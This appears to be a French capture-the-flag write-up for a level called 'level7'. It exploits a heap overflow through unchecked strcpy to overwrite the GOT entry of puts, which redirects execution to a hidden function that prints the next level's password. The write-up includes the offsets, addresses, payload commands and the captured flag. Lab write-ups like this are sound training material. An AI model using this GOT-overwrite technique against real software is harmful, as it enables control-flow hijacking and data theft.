# LEVEL 7

## Intro

Le programme alloue deux petites structures sur le tas. Chaque structure contient un entier et un pointeur vers un tampon de 8 octets. Les arguments passés en ligne de commande sont copiés dans ces tampons avec `strcpy` sans contrôle de taille, ce qui permet un dépassement de tampon sur le tas.

La fonction `m()` (adresse `0x080484f4`) n'est jamais appelée dans `main`. Elle affiche la chaîne globale `c` – remplie avec le contenu du fichier `/home/user/level8/.pass` – suivie de l'heure courante :

```c
void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
{
    time_t tVar1;
    tVar1 = time(NULL);
    printf("%s - %d\n", c, tVar1);
}
```

`main` termine simplement par un `puts("~~")`. En modifiant l'entrée GOT de `puts`, située à `0x08049928`, on peut détourner cet appel afin qu'il exécute `m()` et révèle ainsi le flag.

---

## Calcul de l'offset pour l'overflow

Le code réserve quatre chunks successifs de 8 octets chacun : deux pour les entiers + pointeurs (`puVar1` et `puVar3`), et deux pour les tampons de données. En mémoire, cela donne :

```
[ header A | data A (8) ]   ← puVar1
[ header B | data B (8) ]   ← puVar1[1]
[ header C | data C (8) ]   ← puVar3
[ header D | data D (8) ]   ← puVar3[1]
```

Pour atteindre et réécrire **`puVar3[1]`** (stocké dans `data C` à l’offset 4), il faut franchir :

1. **8 octets** : remplissage complet de `data B` (zone utilisateur du chunk B)
2. **8 octets** : en-tête du chunk C (métadonnées `malloc`)
3. **4 octets** : position de `puVar3[1]` dans la zone `data C`

> **Offset total = 8 + 8 + 4 = 20 octets**

Vérification rapide :

```bash
# extrait les 4 octets écrasés (offset 20)
dd if=payload1 bs=1 skip=20 count=4 2>/dev/null | hexdump -C
```

---

## GOT (Global Offset Table)

Lorsqu’un binaire appelle une fonction externe (comme `puts`), il passe d’abord par la **PLT** (Procedure Linkage Table), qui effectue un saut vers l’adresse stockée dans la **GOT** (Global Offset Table).

* **GOT\[puts]** contient l’adresse effective de `puts` dans la libc.
* En écrasant cette case GOT (via le second `strcpy`), on peut rediriger tous les appels à `puts` vers **n'importe quelle** fonction.

### Pourquoi viser l'entrée GOT de `puts` ?

Le code appelle `puts("~~")` en fin de `main`. En réécrivant l’entrée GOT de `puts` pour qu’elle contienne l’adresse de `m()`, cet appel exécutera `m()` et affichera la variable globale `c` (le flag).

On récupère l’adresse de l’entrée GOT de `puts` par :

```bash
objdump -d level7 | grep -A1 '<puts@plt>'
#    jmp   *0x08049928     ← adresse GOT de puts
```

---

## Payload

1. **`argv[1]`** : Overflow de **20 octets** + adresse GOT de `puts` (`0x08049928`) en little-endian.
2. **`argv[2]`** : Adresse de `m` (`0x080484f4`) en little-endian. Cette valeur sera copiée dans GOT\[puts] par le second `strcpy`.
3. Lorsque `puts("~~")` est appelé, c’est en réalité `m()` qui s’exécute et affiche la variable `c`.

### Commandes

```bash
cd /tmp

# 1) Overflow : écraser puVar3[1] → entrée GOT de puts
echo -ne "$(python2 -c 'print "A"*20 + "\x28\x99\x04\x08"')" > payload1

# 2) Script pour l'adresse de m()
echo -ne "$(python2 -c 'print "\xf4\x84\x04\x08"')" > payload2

# 3) Exécution de l'exploit
./level7 $(cat payload1) $(cat payload2)
```

L’exécution affiche alors le contenu de `c`, c’est-à-dire le flag :

```bash
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
